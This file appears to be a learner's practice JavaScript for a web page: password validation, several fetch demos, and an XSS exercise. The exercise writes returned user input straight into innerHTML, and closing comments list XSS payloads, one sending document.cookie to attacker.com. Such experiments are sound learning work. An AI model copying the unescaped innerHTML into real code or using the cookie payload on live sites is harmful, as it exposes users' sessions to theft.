document.getElementById("password-form").addEventListener("submit", async function(event) {
    event.preventDefault();

    const password = document.getElementById("password").value;
    const regex = /^(?=.*[A-Za-z])(?=.*\d)(?=.*[@#$%])[A-Za-z\d@#$%]{4,8}$/;

    if (!regex.test(password)) {
        alert('密碼得4-8個字, 並包含最少各1個文字, 數字以及@#$%特殊符號');
        return;
    }
    try {
        const response = await fetch('/api/validate-password', {   //requestObjを作成first=requestEndPoint, second=Obj
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({ "password": password })  //jsonに変換
        });

        if (!response.ok) {
            const errorData = await response.json();
            alert('error: ' + errorData.detail);
            return;
        }
        const data = await response.json();
        alert('密碼有効: ' + data.message["password"]);
    } catch (error) {
        console.error('發生error:', error);
        alert('發生error');
    }
});


document.getElementById("fetch-button").addEventListener("click", async function() {
    try {
        const response = await fetch('https://www.google.com', {
        });

        //HTTPステータスエラーとネットワークエラーは別物
        //networkErrorが発生した場合error.messageにはFailed to fetchが含まれる。
        if (!response.ok) {   //HTTPステータスコードが4xxや5xxの場合falseになり、Error()が投げられる
            throw new Error('Network response was not ok');
        }

        const data = await response.text();
        document.getElementById("response").innerText = data;
    } catch (error) {
        console.error('Fetch error:', error);
        document.getElementById("response").innerText = 'Fetch error: ' + error.message;
    }
});



document.getElementById("fetch-button2").addEventListener("click", async function() {
    try {
        const response = await fetch('https://padax.github.io/taipei-day-trip-resources/taipei-attractions-assignment.json');

        if (!response.ok) {
            throw new Error('Network response was not ok');
        }

        const data = await response.json();
        document.getElementById("response2").innerText = JSON.stringify(data);
    } catch (error) {
        console.error('Fetch error:', error);
        document.getElementById("response2").innerText = 'Fetch error: ' + error.message;
    }
});


// 技術的には、.thenと.catchメソッドの中でasync/awaitを使用することは可能ですが、通常は推奨されません。async/awaitを使用するのがベストプラクティス
document.getElementById("fetch-button3").addEventListener("click", async function() {
    try {
        const response = await fetch('http://127.0.0.1:8000/api/data', {
            method: 'GET'
        });

        if (!response.ok) {
            throw new Error('Network response was not ok');
        }

        const data = await response.json();
        document.getElementById("response3").innerText = JSON.stringify(data);
    } catch (error) {
        console.error('Fetch error:', error);
        document.getElementById("response3").innerText = 'Fetch error: ' + error.message;
    }
});






// xss

const urlParams = new URLSearchParams(window.location.search);
const url = urlParams.get('name');


document.getElementById("xssform").addEventListener("submit", async function(event){
    event.preventDefault()
    const name = document.getElementById("name").value;
    const response = await fetch("http://127.0.0.1:8000/api/xss", {
        method: 'POST',
        headers: {
            "Content-Type": "application/json"
        },
        body: JSON.stringify({ name: name})
    })
    const data = await response.json();
    console.log(data)
    console.log(data.name)
    document.getElementById('greeting').innerHTML = data.name;

})
// ブラウザによるアドレスバー自動エンコード
// フォーム送信時の自動エンコード
// JavaScriptのencodeURIやencodeURIComponent関数を使用して、URLやクエリパラメータを手動でエンコード
// ユーザーがブラウザのアドレスバーにURLを入力する際、ブラウザは自動的に特殊文字をエンコードします。例えば、スペースは%20に、<は%3Cに、>は%3Eにエンコードされます
// innerHTMLを使用して挿入されたスクリプトが実行されない場合があります。



/* <script>alert('XSS');</script> */
/* <img src="x" onerror="alert('XSS');">
<script>document.write('<img src="http://attacker.com/steal?cookie=' + document.cookie + '">');</script> */
